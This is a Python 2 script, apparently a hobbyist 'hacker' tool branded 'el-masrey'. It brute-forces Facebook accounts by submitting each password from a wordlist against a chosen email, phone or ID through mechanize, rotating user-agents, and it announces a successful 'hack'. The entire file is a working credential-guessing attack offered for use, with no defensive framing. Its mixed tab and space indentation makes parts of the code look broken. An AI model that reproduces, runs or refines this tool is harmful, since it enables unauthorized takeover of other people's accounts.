#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import os
import sys
import mechanize
import cookielib
import random

os.system('clear')

W = '\033[1;34;40m'
Br = '\033[1;32;40m'
Bg = '\033[1;31;40m'
Y = '\033[1;32;40m'
Bb = '\033[1;32;40m'
Bm = '\033[1;32;40m'
Bc = '\033[1;32;40m'
M = '\033[1;34m'
C = '\033[1;31m'
D = '\033[1;32m'

print(D)

os.system('figlet -f slant "el-masrey"')

print('\r')

print(C)

print('              By ==>  el-masrey')

print(D)

print('      & & & & & & & & & & & & & & & &')

print(M)

ok="""
  =========================================
  =                                       =
  =   ★        H A C K E R  S         ★   =
  =                                       =
  =   ★           ↓↓↓↓↓↓              ★   =
  =                                       =
  = ★ →→→→★==> el-masrey المصرى <==★←←←← ★ =
  =                                       =
  =   ★                ↑↑↑↑↑↑         ★   =
  =                                       =
  =   ★     ( F→A→C→E ¥ B→O→O→K )     ★   =
  =                                       =
  =========================================
"""
print(ok)

print(C)

#email
email = str(raw_input("Email or Phone or ID : "))

#wordlist
passwordlist = str(raw_input("Wordlist or Pass : "))

#Target Website
login = "https://www.facebook.com"

#useragents
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

print(D)

def main():
        global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=0)
	welcome()
	search()
        print('\r')
        print(M)
        print("Password does not exist in the wordlist")
        print(D)

def brute(password):
	sys.stdout.write("\r[*] Connect ====> {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-Agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
        if log != login and (not 'login_attempt' in log):
                        print(Bg +"\n\n[+] Email/Phone/ID : " + email + " Password : ( {} )".format(password)) + W
                        print Bg + "[+] " + email + " Has been Hacked Successfully!!!" + W
	                m = raw_input(' Do You want to exit? [y/n] ')
                        if m == 'y' or m == 'Y' or m == 'yes' or m == 'YES' or m == 'Yes':
                               exit()
                        elif m == 'n' or m == 'N' or m == 'no' or m == 'NO' or m == 'No':
                               os.system('python2 hack.py')

                               

def search():
        global password
        passwords = open(passwordlist,"r")
        for password in passwords:
	      password = password.replace("\n","")
              brute(password)


#welcome 
def welcome():
	total = open(passwordlist,"r")
	total = total.readlines()
        print " [*] Account is Being Hacked : {}".format(email)
        print " [*] Check Up :" , len(total), "passwords"
        print('\r')
        print('\r')
        print " [*] H A C K  N O W  PLEASE  WAIT"
        print " [*] ==> ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓ <== \n"


if __name__ == '__main__':
	main()
